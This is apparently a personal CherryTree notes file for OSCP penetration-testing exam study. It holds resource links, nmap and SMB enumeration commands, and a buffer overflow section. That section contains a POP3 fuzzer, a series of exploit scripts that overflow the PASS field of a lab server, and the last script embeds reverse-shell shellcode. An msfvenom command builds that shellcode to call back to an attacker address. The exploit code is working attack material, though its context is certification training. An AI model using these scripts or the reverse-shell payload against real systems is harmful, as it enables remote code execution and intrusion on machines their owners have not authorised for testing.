<?xml version="1.0" ?>
<cherrytree>
	<node custom_icon_id="0" foreground="" is_bold="False" name="General" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569178799.39" ts_lastsave="1572362312.97" unique_id="1">
		<rich_text>• Exploit interpreter fix: </rich_text>
		<rich_text link="webs https://askubuntu.com/questions/304999/not-able-to-execute-a-sh-file-bin-bashm-bad-interpreter">https://askubuntu.com/questions/304999/not-able-to-execute-a-sh-file-bin-bashm-bad-interpreter</rich_text>
		<rich_text>

• Oscp repo: </rich_text>
		<rich_text link="webs https://github.com/rewardone/OSCPRepo">https://github.com/rewardone/OSCPRepo</rich_text>
		<rich_text>

• Pentest compilation: </rich_text>
		<rich_text link="webs https://github.com/adon90/pentest_compilation">https://github.com/adon90/pentest_compilation</rich_text>
		<rich_text>

• Command Templates: </rich_text>
		<rich_text link="webs https://pentest.ws">https://pentest.ws</rich_text>
		<rich_text>

• Password Lists: </rich_text>
		<rich_text link="webs https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</rich_text>
		<rich_text>

• Automated OSCP reconnaissance tool: </rich_text>
		<rich_text link="webs https://github.com/codingo/Reconnoitre">https://github.com/codingo/Reconnoitre</rich_text>
		<rich_text>

• OSCP Report Template: </rich_text>
		<rich_text link="webs https://github.com/whoisflynn/OSCP-Exam-Report-Template">https://github.com/whoisflynn/OSCP-Exam-Report-Template</rich_text>
		<rich_text>

• OSCP Scripts: </rich_text>
		<rich_text link="webs https://github.com/ihack4falafel/OSCP">https://github.com/ihack4falafel/OSCP</rich_text>
		<rich_text>

• Pentesting resource: </rich_text>
		<rich_text link="webs https://guif.re/">https://guif.re/</rich_text>
		<rich_text>

• FTP Binary mode: </rich_text>
		<rich_text link="webs https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files">https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files</rich_text>
		<rich_text>

• Pentesting Cheatsheet: </rich_text>
		<rich_text link="webs https://ired.team/">https://ired.team/</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Proof" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569753850.79" ts_lastsave="1572353752.83" unique_id="7">
			<rich_text>•</rich_text>
			<rich_text weight="heavy"> Linux Proof:</rich_text>
			<rich_text> cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig

• </rich_text>
			<rich_text weight="heavy">Windows Proof:</rich_text>
			<rich_text> hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="OSCP Guides" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572356602.53" ts_lastsave="1572356702.94" unique_id="11">
			<rich_text>•</rich_text>
			<rich_text weight="heavy"> A Detailed Guide on OSCP Preparation – From Newbie to OSCP:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/">https://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Passing OSCP</rich_text>
			<rich_text>: </rich_text>
			<rich_text link="webs https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html">https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">OSCP Journey exam</rich_text>
			<rich_text>: </rich_text>
			<rich_text link="webs https://h4ck.co/oscp-journey-exam-lab-prep-tips/">https://h4ck.co/oscp-journey-exam-lab-prep-tips/</rich_text>
			<rich_text>

•</rich_text>
			<rich_text weight="heavy"> OSCP Review</rich_text>
			<rich_text>: </rich_text>
			<rich_text link="webs https://hackmethod.com/oscp-review-tips/">https://hackmethod.com/oscp-review-tips/</rich_text>
			<rich_text>

• </rich_text>
			<rich_text weight="heavy">Pentesting Prep for OSCP:</rich_text>
			<rich_text> </rich_text>
			<rich_text link="webs https://github.com/moshekaplan/pentesting_notes/blob/master/OSCP_prep.md">https://github.com/moshekaplan/pentesting_notes/blob/master/OSCP_prep.md</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572362312.97" ts_lastsave="1572614020.8" unique_id="12">
			<rich_text>• Nmap All TCP Ports: nmap -p 1-65535 -T4 -A -v -Pn -oA fullportscan
• Nmap Intense Scan: nmap -T4 -A -v -Pn -oA Intensescan
• Quick UDP Scan: nmap -sU -sV -vv -oA quick_udp

• Port knock: for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done

• Netcat banner grab: nc -v 10.10.10.10 port
• Telnet banner grab: telnet 10.10.10.10 port

• Dirsearch: cd ~/OSCP/Tools/dirsearch/ &amp;&amp; ./dirsearch.py -u </rich_text>
			<rich_text link="webs http://google.com">http://google.com</rich_text>
			<rich_text> -e /
• Gobuster: gobuster dir -u </rich_text>
			<rich_text link="webs https://google.com">https://google.com</rich_text>
			<rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   ◇ Gobuster quick directory busting: gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux
   ◇ Gobuster comprehensive directory busting: gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
   ◇ Gobuster search with file extension: gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php

• SMB Scans:
   ☐  smbmap IP
   ☐  SMB vulnerability scan: nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10
   ☐ SMB Users &amp; Shares Scan: nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10
   ☐ Enum4linux: enum4linux -a 10.10.10.10
   ☐ Null connect: rpcclient -U &quot;&quot; 10.10.10.10
   ☐ Connect to SMB share: smbclient //MOUNT/share

• SNMP enumeration: snmp-check 10.10.10.10

• Web Scans:
    nikto -h 
    wpscan -u

• </rich_text>
			<rich_text weight="heavy">Easy Web Server:</rich_text>
			<rich_text> python -m SimpleHTTPServer 80
• </rich_text>
			<rich_text weight="heavy">Easy FTP server</rich_text>
			<rich_text>: python -m pyftpdlib -p 21 -w

• Non-interactive execute </rich_text>
			<rich_text weight="heavy">powershell</rich_text>
			<rich_text> file: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="Buffer Overflow" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572356166.41" ts_lastsave="1572363094.57" unique_id="10">
		<rich_text>• </rich_text>
		<rich_text weight="heavy">Buffer Overflow video</rich_text>
		<rich_text>: </rich_text>
		<rich_text link="webs https://www.youtube.com/watch?v=OOkU7to0Ty4">https://www.youtube.com/watch?v=OOkU7to0Ty4</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572363010.91" ts_lastsave="1572363014.33" unique_id="15">
			<rich_text>#Create a pattern depending on the buffer size that crashes the application
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700

#Find the exact buffer size that crashes the application by supplying the EIP contents after the crash with the supplied pattern
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438

#We test the bad characters by supplying all the hex characters with our exploit
badchars = (
&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; )

#We execute the following in the imunity debugger white field
!mona modules

#Run this script to find the hex equivalent of jmp esp
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
	nasm &gt; jmp esp

#We execute the following in imunity
!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll

#We generate our shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.167 LPORT=443 -f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d&quot;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="exploit_1.py" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572363033.85" ts_lastsave="1572363060.86" unique_id="16">
			<rich_text>#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'
try:
	print &quot;\nSending evil buffer...&quot;
	s.connect(('10.11.23.12',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print &quot;\nDone!.&quot;
except:
	print &quot;Could not connect to POP3!&quot;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="exploit_2.py" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572363037.09" ts_lastsave="1572363064.91" unique_id="17">
			<rich_text>#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Step 1: buffer = &quot;A&quot;*2606+&quot;B&quot;*4+&quot;C&quot;*90 
# Step 2: buffer = &quot;A&quot;*2606+&quot;B&quot;*4+&quot;C&quot;*(3500-2606-4)

badchars = (
&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; )
buffer = &quot;A&quot;*2606+&quot;B&quot;*4+badchars

try:
	print &quot;\nSending evil buffer...&quot;
	s.connect(('10.11.23.12',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print &quot;\nDone!.&quot;
except:
	print &quot;Could not connect to POP3!&quot;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="exploit_3.py" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572363038.53" ts_lastsave="1572363068.43" unique_id="18">
			<rich_text>#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = &quot;A&quot;*2606+&quot;\x8f\x35\x4a\x5f&quot;+&quot;C&quot;*(3500-2606-4)


try:
	print &quot;\nSending evil buffer...&quot;
	s.connect(('10.11.23.12',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print &quot;\nDone!.&quot;
except:
	print &quot;Could not connect to POP3!&quot;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="exploit_4.py" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572363039.96" ts_lastsave="1572363072.18" unique_id="19">
			<rich_text>#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = (&quot;\xda\xcc\xb8\x85\x1f\x48\x98\xd9\x74\x24\xf4\x5b\x33\xc9\xb1&quot;
&quot;\x52\x83\xc3\x04\x31\x43\x13\x03\xc6\x0c\xaa\x6d\x34\xda\xa8&quot;
&quot;\x8e\xc4\x1b\xcd\x07\x21\x2a\xcd\x7c\x22\x1d\xfd\xf7\x66\x92&quot;
&quot;\x76\x55\x92\x21\xfa\x72\x95\x82\xb1\xa4\x98\x13\xe9\x95\xbb&quot;
&quot;\x97\xf0\xc9\x1b\xa9\x3a\x1c\x5a\xee\x27\xed\x0e\xa7\x2c\x40&quot;
&quot;\xbe\xcc\x79\x59\x35\x9e\x6c\xd9\xaa\x57\x8e\xc8\x7d\xe3\xc9&quot;
&quot;\xca\x7c\x20\x62\x43\x66\x25\x4f\x1d\x1d\x9d\x3b\x9c\xf7\xef&quot;
&quot;\xc4\x33\x36\xc0\x36\x4d\x7f\xe7\xa8\x38\x89\x1b\x54\x3b\x4e&quot;
&quot;\x61\x82\xce\x54\xc1\x41\x68\xb0\xf3\x86\xef\x33\xff\x63\x7b&quot;
&quot;\x1b\x1c\x75\xa8\x10\x18\xfe\x4f\xf6\xa8\x44\x74\xd2\xf1\x1f&quot;
&quot;\x15\x43\x5c\xf1\x2a\x93\x3f\xae\x8e\xd8\xd2\xbb\xa2\x83\xba&quot;
&quot;\x08\x8f\x3b\x3b\x07\x98\x48\x09\x88\x32\xc6\x21\x41\x9d\x11&quot;
&quot;\x45\x78\x59\x8d\xb8\x83\x9a\x84\x7e\xd7\xca\xbe\x57\x58\x81&quot;
&quot;\x3e\x57\x8d\x06\x6e\xf7\x7e\xe7\xde\xb7\x2e\x8f\x34\x38\x10&quot;
&quot;\xaf\x37\x92\x39\x5a\xc2\x75\x4c\x90\xcc\x22\x38\xa4\xcc\x2d&quot;
&quot;\x02\x21\x2a\x47\x64\x64\xe5\xf0\x1d\x2d\x7d\x60\xe1\xfb\xf8&quot;
&quot;\xa2\x69\x08\xfd\x6d\x9a\x65\xed\x1a\x6a\x30\x4f\x8c\x75\xee&quot;
&quot;\xe7\x52\xe7\x75\xf7\x1d\x14\x22\xa0\x4a\xea\x3b\x24\x67\x55&quot;
&quot;\x92\x5a\x7a\x03\xdd\xde\xa1\xf0\xe0\xdf\x24\x4c\xc7\xcf\xf0&quot;
&quot;\x4d\x43\xbb\xac\x1b\x1d\x15\x0b\xf2\xef\xcf\xc5\xa9\xb9\x87&quot;
&quot;\x90\x81\x79\xd1\x9c\xcf\x0f\x3d\x2c\xa6\x49\x42\x81\x2e\x5e&quot;
&quot;\x3b\xff\xce\xa1\x96\xbb\xff\xeb\xba\xea\x97\xb5\x2f\xaf\xf5&quot;
&quot;\x45\x9a\xec\x03\xc6\x2e\x8d\xf7\xd6\x5b\x88\xbc\x50\xb0\xe0&quot;
&quot;\xad\x34\xb6\x57\xcd\x1c&quot;)

buffer = &quot;A&quot;*2606+&quot;\x8f\x35\x4a\x5f&quot;+ &quot;\x90&quot; * 16 + shellcode + &quot;C&quot;*(3500-2606-4-351-16)


try:
	print &quot;\nSending evil buffer...&quot;
	s.connect(('10.11.23.12',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print &quot;\nDone!.&quot;
except:
	print &quot;Could not connect to POP3!&quot;</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Fuzzer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572363082.75" ts_lastsave="1572363085.2" unique_id="20">
			<rich_text>#!/usr/bin/python
import socket

# Create an array of buffers, from 1 to 5900, with increments of 200.
buffer=[&quot;A&quot;]
counter=100
while len(buffer) &lt;= 30:
	buffer.append(&quot;A&quot;*counter)
	counter=counter+200

for string in buffer:
	print &quot;Fuzzing PASS with %s bytes&quot; % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.12',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="script.py" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572363094.57" ts_lastsave="1572363097.22" unique_id="21">
			<rich_text>#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	print &quot;\nSending evil buffer...&quot;
	s.connect(('10.11.23.12',110)) 	# connect to IP, POP3 port
	data = s.recv(1024) 		# receive banner
	print data 			# print banner

	s.send('USER test' +'\r\n') 	# send username &quot;test&quot;
	data = s.recv(1024) 		# receive reply
	print data 			# print reply

	s.send('PASS test\r\n') 	# send password &quot;test&quot;
	data = s.recv(1024) 		# receive reply
	print data 			# print reply

	s.close() 			# close socket
	print &quot;\nDone!&quot;
except:
	print &quot;Could not connect to POP3!&quot;</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="Offensive Security Links" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1572340238.17" ts_lastsave="1572340772.27" unique_id="9">
		<rich_text>• OSCP Certification Exam Guide: </rich_text>
		<rich_text link="webs https://support.offensive-security.com/oscp-exam-guide/">https://support.offensive-security.com/oscp-exam-guide/</rich_text>
		<rich_text>
• Proctored Exam Guide: </rich_text>
		<rich_text link="webs https://www.offensive-security.com/faq/#proc-1">https://www.offensive-security.com/faq/#proc-1</rich_text>
		<rich_text>
   ◇ </rich_text>
		<rich_text link="webs https://support.offensive-security.com/proctoring-faq/">https://support.offensive-security.com/proctoring-faq/</rich_text>
		<rich_text>
• OSCP Exam FAQ: </rich_text>
		<rich_text link="webs https://forums.offensive-security.com/showthread.php?2191-FAQ-Questions-about-the-OSCP-Exam">https://forums.offensive-security.com/showthread.php?2191-FAQ-Questions-about-the-OSCP-Exam</rich_text>
		<rich_text>
• Common Technical Issues: </rich_text>
		<rich_text link="webs https://forums.offensive-security.com/showthread.php?2190-Common-Technical-Issues">https://forums.offensive-security.com/showthread.php?2190-Common-Technical-Issues</rich_text>
		<rich_text>
• General Questions: </rich_text>
		<rich_text link="webs https://forums.offensive-security.com/showthread.php?2189-General-questions-about-the-PWK-course">https://forums.offensive-security.com/showthread.php?2189-General-questions-about-the-PWK-course</rich_text>
		<rich_text>
• Network Introduction Guide: </rich_text>
		<rich_text link="webs https://support.offensive-security.com/pwk-network-intro-guide/">https://support.offensive-security.com/pwk-network-intro-guide/</rich_text>
		<rich_text>

</rich_text>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="Web" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569786369.67" ts_lastsave="1572356239.73" unique_id="8">
		<rich_text>• </rich_text>
		<rich_text weight="heavy">LFI/RFI:</rich_text>
		<rich_text> </rich_text>
		<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-rfi">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-rfi</rich_text>
		<rich_text>

• </rich_text>
		<rich_text weight="heavy">MSSQL Injection:</rich_text>
		<rich_text> </rich_text>
		<rich_text link="webs https://www.exploit-db.com/papers/12975">https://www.exploit-db.com/papers/12975</rich_text>
		<rich_text>
   ◇ MSSQL Union Based Injection: </rich_text>
		<rich_text link="webs http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html">http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html</rich_text>
		<rich_text>
   ◇ MSSQL SQL Injection Cheat Sheet: </rich_text>
